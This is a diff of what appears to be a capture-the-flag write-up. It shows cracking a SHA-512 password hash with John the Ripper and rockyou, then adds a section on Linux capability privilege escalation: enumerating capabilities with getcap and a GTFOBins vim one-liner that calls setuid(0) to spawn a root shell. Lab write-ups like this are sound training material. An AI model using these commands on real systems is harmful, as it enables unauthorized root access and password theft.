@@ -297,4 +297,17 @@ and i found the desired hashes...
 echo "$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/" > hash; john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
  ---
- 
+# Privilege Escalation: Capabilities
+
+#### Find the Capabilities
+```bash
+getcap -r /
+```
+There is a capability for `VIM`....
+
+[GTFOBINS](https://gtfobins.github.io/)
+```bash
+./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+```
+#### The Flag...
+![root](../../photos/root.png)
